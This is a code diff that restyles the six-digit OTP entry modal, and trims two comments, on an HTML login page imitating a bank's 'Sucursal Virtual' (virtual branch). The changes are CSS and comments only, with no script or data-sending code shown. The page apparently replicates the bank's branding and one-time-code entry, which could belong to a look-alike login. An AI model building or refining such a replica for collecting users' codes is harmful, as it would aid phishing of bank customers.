@@ -316,33 +316,38 @@
       .demo-placeholder{gap:6px;}
     }
 
-    /* Estilo del modal OTP (6 slots) */
-    .otp-slots-container {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      margin: 24px 0;
+    /* ====== MODAL OTP CON RAYITAS ====== */
+    .otp-slots-container { 
+      display: flex; 
+      justify-content: center; 
+      gap: 15px; 
+      margin: 24px 0; 
     }
     .otp-slot {
-      width: 45px;
-      height: 50px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
+      width: 35px;
+      height: 45px;
+      border: none;
+      border-bottom: 2px solid #2c2a29;
+      border-radius: 0;
       text-align: center;
-      font-size: 1.5rem;
-      line-height: 50px;
+      font-size: 1.8rem;
+      line-height: 45px;
       font-weight: bold;
-      background: #fdfdfd;
-      color: #2c2a29;
+      background: transparent;
+      color: var(--bc-dark);
+      padding: 0;
     }
-    .otp-slot.active {
-      border-color: #fdda24;
-      box-shadow: 0 0 5px rgba(253, 218, 36, 0.5);
+    .otp-slot.active { 
+      border-bottom-color: #fdda24; 
+      box-shadow: 0 5px 5px -5px rgba(253,218,36,.8); 
     }
-    .otp-hidden-input {
-      position: absolute;
-      opacity: 0;
-      pointer-events: none;
+    .otp-slots-container.error .otp-slot { 
+      border-bottom-color: #d9381e; 
+    }
+    .otp-hidden-input { 
+      position: absolute; 
+      opacity: 0; 
+      pointer-events: none; 
     }
 
     /* Estilos del Footer */
@@ -500,7 +505,7 @@
                 </section>
                </form>
 
-               <!-- Enlace Crear Usuario restaurado -->
+               <!-- Enlace Crear Usuario -->
                <section class="bc-card-auth-link" style="display: flex; justify-content: center; margin-top: 24px;">
                 <a href="#" class="bc-link link-underline" style="font-size: 1rem; color: #2c2a29;">
                   <u>Crear usuario</u>
@@ -516,7 +521,7 @@
                 </div>
               </div>
             </main>
-            <!-- Footer restaurado -->
+            <!-- Footer -->
             <footer class="svp-footer">
               <p>¿Problemas para conectarte? · Aprende sobre seguridad · Reglamento Sucursal Virtual · Política de privacidad</p>
               <p id="reloj-widget" style="margin-top:8px;"></p>
